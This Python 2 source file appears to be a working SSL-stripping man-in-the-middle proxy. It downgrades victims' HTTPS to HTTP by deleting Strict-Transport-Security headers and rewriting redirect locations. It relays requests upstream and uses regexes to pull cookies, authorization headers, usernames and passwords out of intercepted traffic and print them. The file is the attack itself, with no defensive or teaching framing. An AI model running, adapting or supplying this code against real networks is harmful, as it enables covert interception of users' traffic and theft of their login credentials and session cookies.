from __future__ import print_function
import logging
logging.getLogger("httplib").setLevel(logging.CRITICAL)
logging.getLogger("scapy.runtime").setLevel(logging.CRITICAL)
import httplib
import urlparse
import threading
from scapy.all import *
from BaseHTTPServer import BaseHTTPRequestHandler
from SSLStrip import SSLStrip as SSLStrip


class ProxyRequestHandler(BaseHTTPRequestHandler):
    lock = threading.Lock()

    def __init__(self, *args, **kwargs):
        self.tls = threading.local()
        self.tls.socket = {}
        self.timeout = 5
        self.SSLStrip = SSLStrip()
        BaseHTTPRequestHandler.__init__(self, *args, **kwargs)

    @staticmethod
    def get_credentials(headers, body):
        if headers:
            cookie_pattern = ['Cookie:', 'cookie:']
            credentials_patern = ['Authorization:', 'authorization:', 'WWW-Authenticate',
                                  'www-authenticate', 'Proxy-Authorization', 'Proxy-Authenticate']
            for h in headers:
                for pattern in cookie_pattern:
                    if re.search(pattern,  headers[h]):
                        print(
                            "\033[91mFOUND COOKIE: {}033[0m".format(headers[h]))
                for i in credentials_patern:
                    if re.search(i,  headers[h]):
                        print(
                            "\033[91mFOUND CREDENTIALS: {}033[0m".format(headers[h]))
        if body:
            user_regex = '([Uu]ser|[Ll]ogin|[Uu]sername|[Ii][Dd]|[Ee]mail|[Nn]ame)=([^&|;]*)'
            password_regex = '([Pp]assword|[Pp]ass|[Pp]wd|[Pp]asswd|[Pp]asswrd)=([^&|;]*)'
            raw = str(body.replace("\n", " "))
            users = re.findall(user_regex, raw)
            passwords = re.findall(password_regex, raw)
            if users:
                print("\033[91mFOUND USER: {}033[0m".format(str(users[0][1])))
            if passwords:
                print("\033[91mFOUND USER: {}033[0m".format(
                    str(passwords[0][1])))

    def do_GET(self):
        req = self
        content_length = int(req.headers.get('Content-Length', 0))
        req_body = self.rfile.read(content_length) if content_length else None
        self.get_credentials(req.headers, req_body)
        self.SSLStrip.request_handler(req, self.connection)
        print("HTTP from: {} \033[94m\033[1m{}\033[0m\033[94m {}\033[0m".format(req.client_address[0][7::], req.command, "/"))
        url = urlparse.urlsplit(req.path)
        path = (url.path + '?' + url.query if url.query else url.path)
        assert url.scheme in ('http', 'https')
        req.headers['Host'] = url.netloc
        prefixes = ["wwww", "wintra"]
        for prefix in prefixes:
            if url.netloc.startswith(prefix):
                url = url._replace(scheme="https", netloc=url.netloc[1:])
        setattr(req, 'headers', self.clean_headers(req.headers))
        try:
            if url.scheme == 'https':
                self.tls.socket = httplib.HTTPSConnection(url.netloc, timeout=self.timeout)
            else:
                self.tls.socket = httplib.HTTPConnection(url.netloc, timeout=self.timeout)
            self.tls.socket.request(self.command, path, req_body, dict(req.headers))
            res = self.tls.socket.getresponse()
            version_table = {10: 'HTTP/1.0', 11: 'HTTP/1.1'}
            setattr(res, 'headers', res.msg)
            setattr(res, 'response_version', version_table[res.version])
            res_body = res.read()
        except Exception as e:
            print ("Exception ---> {}".format(e))
            del self.tls.socket
            self.send_error(418)
            return

        res_body_modified = self.SSLStrip.response_handler(req, res, res_body, url, path)

        if res_body_modified is not None:
            res.headers['Content-Length'] = str(len(res_body_modified))

        setattr(res, 'headers', self.clean_headers(res.headers))
        self.wfile.write("%s %d %s\r\n" % (self.protocol_version, res.status, res.reason))
        for line in res.headers.headers:
            self.wfile.write(line)
        self.end_headers()
        self.wfile.write(res_body_modified)
        self.wfile.flush()

    do_HEAD = do_GET

    def clean_headers(self, headers):
        hop_by_hop = ('connection', 'keep-alive', 'proxy-authenticate',
                      'proxy-authorization', 'te', 'trailers', 'transfer-encoding', 'upgrade')
        if 'Strict-Transport-Security' in headers:
            del headers['Strict-Transport-Security']

        if 'Location' in headers:
            headers['Location'] = headers['Location'].replace("https://","http://w")
        for k in hop_by_hop:
            del headers[k]
        del headers['Accept-Encoding'] # mhhhhhhhhhHHH .........
        return headers